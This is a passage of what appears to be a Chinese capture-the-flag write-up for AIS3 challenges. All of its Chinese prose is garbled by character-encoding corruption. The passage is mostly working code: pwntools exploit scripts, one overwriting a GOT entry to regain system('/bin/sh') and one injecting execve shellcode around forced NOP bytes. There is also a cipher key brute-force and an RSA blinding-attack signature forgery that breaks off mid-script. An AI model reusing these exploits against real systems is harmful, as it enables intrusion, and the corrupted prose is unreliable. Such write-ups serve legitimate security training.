	<span style=color:#e6db74>&#34;04w&#34;</span>, <span style=color:#e6db74>&#34;13a&#34;</span>, <span style=color:#e6db74>&#34;01r&#34;</span>, <span style=color:#e6db74>&#34;14z&#34;</span>,
	<span style=color:#e6db74>&#34;07K&#34;</span>, <span style=color:#e6db74>&#34;03=&#34;</span>, <span style=color:#e6db74>&#34;02=&#34;</span>, <span style=color:#e6db74>&#34;01=&#34;</span>,
];

<span style=color:#a6e22e>b64</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}&#34;</span> <span style=color:#75715e>// 64 chars
</span><span style=color:#75715e></span><span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>

<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>seg</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>seg</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>enc</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>seg</span><span style=color:#f92672>+=</span><span style=color:#ae81ff>4</span>) {
	<span style=color:#a6e22e>bits</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
		<span style=color:#a6e22e>bits</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>enc</span>[<span style=color:#a6e22e>seg</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>i</span>][<span style=color:#ae81ff>0</span>];
		<span style=color:#a6e22e>bits</span> <span style=color:#f92672>+=</span> (parseInt(<span style=color:#a6e22e>enc</span>[<span style=color:#a6e22e>seg</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>i</span>][<span style=color:#ae81ff>1</span>])<span style=color:#f92672>&gt;&gt;&gt;</span><span style=color:#ae81ff>0</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>2</span>).<span style=color:#a6e22e>padStart</span>(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#39;0&#39;</span>);
		<span style=color:#a6e22e>bits</span> <span style=color:#f92672>+=</span> (<span style=color:#a6e22e>b64</span>.<span style=color:#a6e22e>indexOf</span>(<span style=color:#a6e22e>enc</span>[<span style=color:#a6e22e>seg</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>i</span>][<span style=color:#ae81ff>2</span>])<span style=color:#f92672>&gt;&gt;&gt;</span><span style=color:#ae81ff>0</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>2</span>).<span style=color:#a6e22e>padStart</span>(<span style=color:#ae81ff>6</span>, <span style=color:#e6db74>&#39;0&#39;</span>);
	}
	<span style=color:#a6e22e>bits</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>bits</span>.<span style=color:#a6e22e>match</span>(<span style=color:#e6db74>/.{1,8}/g</span>);
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
		<span style=color:#a6e22e>flag</span> <span style=color:#f92672>+=</span> String.<span style=color:#a6e22e>fromCharCode</span>(parseInt(<span style=color:#a6e22e>bits</span>[<span style=color:#a6e22e>i</span>], <span style=color:#ae81ff>2</span>))
}
<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>flag</span>);
</code></pre></div><p>å¾ˆå¤šäºº(æˆ‘ä¹Ÿæœ‰ä»½)ä¸€é–‹å§‹ä¸Šå‚³</p><p><code>AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}</code></p><p>ä¸€ç›´åˆ°å®˜æ–¹å‡ºä¾†æ¾„æ¸…é€™ä¸æ˜¯Flagåˆ¥å†å‚³äº†&mldr;</p><p>ç„¶å¾Œå¯«å®Œæ‰æƒ³åˆ°å…¶å¯¦decoderç”¨Pythonå¯«å°±å¥½äº†ï¼Œå¹¹éº»ç¹¼çºŒå¯«JSæŠ˜ç£¨è‡ªå·± XD</p><p><code>AIS3{base1024_15_c0l0RFuL_GAM3_CL3Ar_thIS_IS_y0Ur_FlaG!}</code></p><hr><h1 id=pwn>PWN<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h1><h2 id=write-me>Write Me<a hidden class=anchor aria-hidden=true href=#write-me>#</a></h2><p>é¡Œç›®æœ‰çµ¦Source</p><p>åŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ å¯«8-byteåˆ°ä»»æ„åœ°æ–¹</p><p>åªæ˜¯å› ç‚º<code>system@got</code>è¢«å¯«0ï¼Œæœ€å¾Œçš„<code>system("/bin/sh");</code>è·‘ä¸å‡ºä¾†</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
{
    setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
    setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
    <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>systemgot <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x404028</span>;
    <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>scanfgot <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x404040</span>;
    <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)systemgot <span style=color:#f92672>=</span> (<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span>)<span style=color:#ae81ff>0x0</span>;

    printf(<span style=color:#e6db74>&#34;Address: &#34;</span>);
    <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>addr;
    <span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> v;
    scanf(<span style=color:#e6db74>&#34;%ld&#34;</span>,<span style=color:#f92672>&amp;</span>addr);
    printf(<span style=color:#e6db74>&#34;Value: &#34;</span>);
    scanf(<span style=color:#e6db74>&#34;%ld&#34;</span>,<span style=color:#f92672>&amp;</span>v);
    <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)addr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span>)v;

    <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)scanfgot <span style=color:#f92672>=</span> (<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span>)<span style=color:#ae81ff>0x0</span>;
    printf(<span style=color:#e6db74>&#34;OK! Shell for you :)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
    system(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>);
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>binaryçš„åå­—å«åšgotplt</p><p>checksec çš„çµæœæ˜¯Partial Relocation + No PIE</p><p>ä¹Ÿå°±æ˜¯é€™å€‹ELFè£¡é¢çš„offsetåœ¨æ¯æ¬¡åŸ·è¡Œéƒ½ä¸€æ¨£ï¼Œè€Œä¸”GOT tableå¯å¯«</p><p>æ‰€ä»¥æŠŠ<code>system@got</code>çš„ä½å€é‚„åŸå°±å¯ä»¥é †åˆ©è·‘<code>system("/bin/sh")</code>äº†</p><p>å› ç‚ºæ˜¯ç”¨<code>scanf("%ld")</code>ï¼Œæ‰€ä»¥è¦è¨˜å¾—æŠŠä½å€è½‰åé€²ä½å†è¼¸å…¥</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;info&#39;</span>
binary <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./gotplt&#39;</span>)

<span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>REMOTE:
    p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;quiz.ais3.org&#39;</span>, <span style=color:#ae81ff>10102</span>)
<span style=color:#66d9ef>else</span>:
    p <span style=color:#f92672>=</span> process(binary<span style=color:#f92672>.</span>path)

p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;Address: &#39;</span>)
p<span style=color:#f92672>.</span>sendline(str(<span style=color:#ae81ff>4210728</span>))
p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;Value: &#39;</span>)
p<span style=color:#f92672>.</span>sendline(str(<span style=color:#ae81ff>4198480</span>))
p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>flag æ”¾åœ¨home/gotplt/flag</p><p><code>AIS3{Y0u_know_h0w_1@2y_b1nd1ng_w@rking}</code></p><p>è©±èªªGOT Hijackingä¸æ˜¯æ‡‰è©²æœƒå’ŒROPä¸€èµ·å‡ºæˆæŸå€‹æ¨¡æ¿é¡Œå—ï¼Ÿ</p><p>é€™é¡Œçš„è€ƒæ³•ä¹Ÿå¤ªç›´ç™½&mldr;å°±ç®—ä¸çŸ¥é“lazy bindingå¥½åƒä¹Ÿèƒ½ççŒœå‡ºä¾†ï¼Ÿ</p><hr><h2 id=noper>Noper<a hidden class=anchor aria-hidden=true href=#noper>#</a></h2><p>é¡Œç›®æ²’çµ¦Source</p><p>å®ƒæœƒè®€64-byte é€²å»ç„¶å¾Œç•¶åš opcode å»åŸ·è¡Œ</p><p>åªæ˜¯åœ¨åŸ·è¡Œå‰æœƒç”¨<code>rand()</code>é¸å‡ºä¸€äº›byteç„¶å¾Œå¯«å…¥0x90 (x86-64æŒ‡ä»¤é›†çš„NOPæŒ‡ä»¤)</p><p>å› ç‚ºæ˜¯å¾64-byteç•¶ä¸­é¸å‡º9å€‹ï¼Œä¸€é–‹å§‹ä»¥ç‚ºå¤šå‚³å¹¾æ¬¡å°±å¥½äº†</p><p>çœ‹äº†è€åŠå¤©æ‰ç™¼ç¾ä»–æ ¹æœ¬æ²’åšésrand(time(NULL))</p><p>é€™ç¨®æ™‚å€™ç›¸ç•¶æ–¼ç”¨srand(1)åˆå§‹åŒ–</p><p>æ‰€ä»¥æœ¬æ©Ÿå’Œä¼ºæœå™¨ä¸Šæ¯æ¬¡åŸ·è¡Œæ™‚å¡«NOPçš„ä½ç½®éƒ½ä¸€æ¨£</p><p>æ¥ä¸‹ä¾†å°±æ˜¯æŠŠpayloadè£¡çš„opcodeåˆ†æ®µå¡é€²ä¸æœƒè¢«å¡«NOPçš„ç¸«éš™è£¡</p><p>æˆ‘å¡çš„shellcodeæ˜¯<a href=http://shell-storm.org/shellcode/files/shellcode-603.php>é€™å€‹</a></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;info&#39;</span>
binary <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./noper&#39;</span>)

<span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>REMOTE:
    p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;quiz.ais3.org&#39;</span>, <span style=color:#ae81ff>5002</span>)
<span style=color:#66d9ef>else</span>:
    p <span style=color:#f92672>=</span> process(binary<span style=color:#f92672>.</span>path)

<span style=color:#75715e># NOP in payload: 6, 10, 13, 17, 39, 41, 44, 51, 63</span>
payload  <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xd2\x90\x90\x90\x90\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 0 - 7</span>
payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 8  - 17</span>
payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 18 - 27</span>
payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 28 - 37</span>
payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x90\x90\x90\x90\x90\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 38 - 44</span>
payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x89\xe6\xb0\x3b\x90\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 45 - 51</span>
payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0f\x05</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 52 - 53</span>

p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;code:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
p<span style=color:#f92672>.</span>sendline(payload)
p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>flag æ”¾åœ¨ home/noper/flag</p><p><code>AIS3{nOp_noOp_NOoop!!!}</code></p><p>è »æœ‰è¶£çš„å¡shellcodeé¡Œ</p><p>é€™ä¸€é¡Œæ˜¯é¦–æ®ºã€è±ªçˆ½</p><hr><h1 id=crypto>CRYPTO<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h1><h2 id=microchip>Microchip<a hidden class=anchor aria-hidden=true href=#microchip>#</a></h2><p>é¡Œç›®Sourceæ˜¯C++ï¼Œåªæ˜¯ç”¨macroå’Œtemplateä¹‹é¡çš„æ±æ±</p><p>æŠŠèªæ³•å¼„å¾—å¾ˆåƒPythonï¼Œé€™ä¹Ÿå¤ªè®Šæ…‹äº†å§</p><p>å¹¸å¥½åŠ å¯†é‚è¼¯å¾ˆå–®ç´”</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;python.h&#34;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
def <span style=color:#a6e22e>track</span>(name, id) <span style=color:#f92672>-&gt;</span> str <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                    {

    <span style=color:#66d9ef>if</span> len(name) <span style=color:#f92672>%</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                     ){
        padded <span style=color:#f92672>=</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;4444&#34;</span>                                                  ;}
    elif len(name) <span style=color:#f92672>%</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                   ){
        padded <span style=color:#f92672>=</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;333&#34;</span>                                                   ;}
    elif len(name) <span style=color:#f92672>%</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                   ){
        padded <span style=color:#f92672>=</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;22&#34;</span>                                                    ;}
    elif len(name) <span style=color:#f92672>%</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span> <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                   ){
        padded <span style=color:#f92672>=</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;1&#34;</span>                                                     ;}

    keys <span style=color:#f92672>=</span> list()                                                               ;
    temp <span style=color:#f92672>=</span> id                                                                   ;
    <span style=color:#66d9ef>for</span> i in range(<span style=color:#ae81ff>4</span>) <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                         ){
        keys.append(temp <span style=color:#f92672>%</span> <span style=color:#ae81ff>96</span>)                                                  ;
        temp <span style=color:#f92672>=</span> <span style=color:#66d9ef>int</span>(temp <span style=color:#f92672>/</span> <span style=color:#ae81ff>96</span>)                                                   ;}

    result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>                                                                 ;
    <span style=color:#66d9ef>for</span> i in range(<span style=color:#ae81ff>0</span>, len(padded), <span style=color:#ae81ff>4</span>) <span style=color:#960050;background-color:#1e0010>ê‰</span>                                         ){

        nums <span style=color:#f92672>=</span> list()                                                           ;
        <span style=color:#66d9ef>for</span> j in range(<span style=color:#ae81ff>4</span>) <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                     ){
            num <span style=color:#f92672>=</span> ord(padded[i <span style=color:#f92672>+</span> j]) <span style=color:#f92672>-</span> <span style=color:#ae81ff>32</span>                                       ;
            num <span style=color:#f92672>=</span> (num <span style=color:#f92672>+</span> keys[j]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>96</span>                                          ;
            nums.append(num <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>)                                               ;}

        result <span style=color:#f92672>+=</span> chr(nums[<span style=color:#ae81ff>3</span>])                                                  ;
        result <span style=color:#f92672>+=</span> chr(nums[<span style=color:#ae81ff>2</span>])                                                  ;
        result <span style=color:#f92672>+=</span> chr(nums[<span style=color:#ae81ff>1</span>])                                                  ;
        result <span style=color:#f92672>+=</span> chr(nums[<span style=color:#ae81ff>0</span>])                                                  ;}

    <span style=color:#66d9ef>return</span> result                                                               ;}


def <span style=color:#a6e22e>main</span>() <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>int</span> <span style=color:#960050;background-color:#1e0010>ê‰</span>                                                             {

    name <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;flag.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>).read().strip()                                 ;
    id <span style=color:#f92672>=</span> <span style=color:#66d9ef>int</span>(input(<span style=color:#e6db74>&#34;key = &#34;</span>))                                                   ;

    print(<span style=color:#e6db74>&#34;result is:&#34;</span>, track(name, id))                                        ;
	<span style=color:#75715e>//     result is: =Js&amp;;*A`odZHi&#39;&gt;D=Js&amp;#i-DYf&gt;Uy&#39;yuyfyu&lt;)Gu
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>                                                                    ;}

</code></pre></div><p>ä¸€å€‹Blockæ˜¯å››å€‹å­—å…ƒï¼ŒKey è¢«é‡è¤‡ä½¿ç”¨</p><p>å› ç‚ºåŠ å¯†éç¨‹åªç”¨åˆ°mod 96åº•ä¸‹çš„åŠ æ¸›æ³•ï¼Œè§£å¯†éç¨‹å¾ˆå®¹æ˜“å¯«å‡ºä¾†</p><p>ç„¶å¾Œæˆ‘å€‘å¤§æ¦‚å¯ä»¥çŒœåˆ°æ˜æ–‡çš„å‰å››å€‹å­—å…ƒæœƒæ˜¯AIS3</p><p>æ‰€ä»¥æŠŠKeyçˆ†æœå‡ºä¾†å†æ‹¿å»è§£å¯†å°±å¥½äº†</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
cipher <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;=Js&amp;;*A`odZHi&#39;&gt;D=Js&amp;#i-DYf&gt;Uy&#39;yuyfyu&lt;)Gu&#34;</span>

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>brutekeys</span>(p, c):
    keys <span style=color:#f92672>=</span> []
    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
        <span style=color:#66d9ef>for</span> key <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>96</span>):
            <span style=color:#66d9ef>if</span> ((ord(p[i])<span style=color:#f92672>-</span><span style=color:#ae81ff>32</span>) <span style=color:#f92672>+</span> key) <span style=color:#f92672>%</span> <span style=color:#ae81ff>96</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>==</span> ord(c[<span style=color:#ae81ff>3</span><span style=color:#f92672>-</span>i]):
                keys<span style=color:#f92672>.</span>append(key)
    <span style=color:#66d9ef>return</span> keys

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>dec</span>(cipher, keys):
    plain <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
        plain <span style=color:#f92672>+=</span> chr(((ord(cipher[<span style=color:#ae81ff>3</span><span style=color:#f92672>-</span>i])<span style=color:#f92672>-</span><span style=color:#ae81ff>32</span>) <span style=color:#f92672>-</span> keys[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>96</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>)
    <span style=color:#66d9ef>return</span> plain

keys <span style=color:#f92672>=</span> brutekeys(<span style=color:#e6db74>&#39;AIS3&#39;</span>, cipher[<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>4</span>])
flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(cipher)<span style=color:#f92672>//</span><span style=color:#ae81ff>4</span>):
    flag <span style=color:#f92672>+=</span> dec(cipher[<span style=color:#ae81ff>4</span><span style=color:#f92672>*</span>i:<span style=color:#ae81ff>4</span><span style=color:#f92672>*</span>(i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)], keys)
<span style=color:#66d9ef>print</span>(flag)
</code></pre></div><p><code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}</code></p><hr><h2 id=resident-evil-village>ReSident evil villAge<a hidden class=anchor aria-hidden=true href=#resident-evil-village>#</a></h2><p>ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨RSAå¹«ä½ ç°½ä»»æ„å­—ä¸²(blind signing)</p><p>ä½†æ˜¯ä¸æœƒå¹«ä½ ç°½"Ethan Winters&rdquo;</p><p>æˆ‘å€‘éœ€è¦å½é€ ä¸€ä»½ç”¨serverçš„ç§é‘°ç°½"Ethan Winters"çš„æ•¸ä½ç°½è­‰</p><p>åšåˆ°çš„è©±å°±çµ¦Flag</p><p>é¡Œç›®ä¸»è¦é‚è¼¯ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>	<span style=color:#66d9ef>if</span> option <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>: <span style=color:#75715e># Sign a message</span>
		self<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>sendall(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Name (in hex): &#39;</span>)
		msg <span style=color:#f92672>=</span> unhexlify(self<span style=color:#f92672>.</span>recv())
		<span style=color:#66d9ef>if</span> msg <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Ethan Winters&#39;</span> <span style=color:#f92672>or</span> bytes_to_long(msg) <span style=color:#f92672>&gt;=</span> n:  <span style=color:#75715e># msg+k*n not allowed</span>
			self<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Nice try!&#39;</span>)
		<span style=color:#66d9ef>else</span>:
			sig <span style=color:#f92672>=</span> pow(bytes_to_long(msg), privkey<span style=color:#f92672>.</span>d, n)
            <span style=color:#75715e># TODO: Apply hashing first to prevent forgery</span>
			self<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Signature: &#39;</span> <span style=color:#f92672>+</span> str(sig)<span style=color:#f92672>.</span>encode())

	<span style=color:#66d9ef>elif</span> option <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>: <span style=color:#75715e># Verify a signed message</span>
		self<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>sendall(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Signature: &#39;</span>)
		sig <span style=color:#f92672>=</span> int(self<span style=color:#f92672>.</span>recv())
		verified <span style=color:#f92672>=</span> (pow(sig, e, n) <span style=color:#f92672>==</span> bytes_to_long(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Ethan Winters&#39;</span>))
		<span style=color:#66d9ef>if</span> verified:
			self<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;AIS3{THIS_IS_A_FAKE_FLAG}&#39;</span>)
		<span style=color:#66d9ef>else</span>:
			self<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Well done!&#39;</span>)
</code></pre></div><p>å®˜æ–¹é‚„å¾ˆå¥½å¿ƒåœ¨TODOé‚£å€‹åœ°æ–¹æ”¾ä¸€å€‹æç¤º</p><p>æ•¸ä½ç°½è­‰æ‡‰è©²è¦ç°½æ˜æ–‡çš„Hashè€Œä¸æ˜¯æ˜æ–‡æœ¬èº«</p><p>å†åŠ ä¸Šæˆ‘å€‘æœ‰ä¸€å®šç¨‹åº¦çš„Blind Signing</p><p>å¯ä»¥ç”¨<a href=https://masterpessimistaa.wordpress.com/2017/07/10/blinding-attack-on-rsa-digital-signatures/>Blinding Attack</a>å½é€ ç°½è­‰</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
<span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, inverse

context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;info&#39;</span>

p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;quiz.ais3.org&#39;</span>, <span style=color:#ae81ff>42069</span>)
p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;n = &#39;</span>)
n <span style=color:#f92672>=</span> int(p<span style=color:#f92672>.</span>recvline())
e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;3) exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)

r <span style=color:#f92672>=</span> <span style=color:#ae81ff>1337</span> <span style=color:#75715e># blinding factor, can be anything</span>
m <span style=color:#f92672>=</span> bytes_to_long(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Ethan Winters&#39;</span>)
M <span style=color:#f92672>=</span> (pow(r, e, n) <span style=color:#f92672>*</span> m ) <span style=color:#f92672>%</span> n    <span style=color:#75715e># M === (r^e) * m mod n</span>
p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;1&#39;</span>)                <span style=color:#75715e># sign M</span>
p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;(in hex): &#39;</span>)
p<span style=color:#f92672>.</span>sendline(hex(M)[<span style=color:#ae81ff>2</span>:])
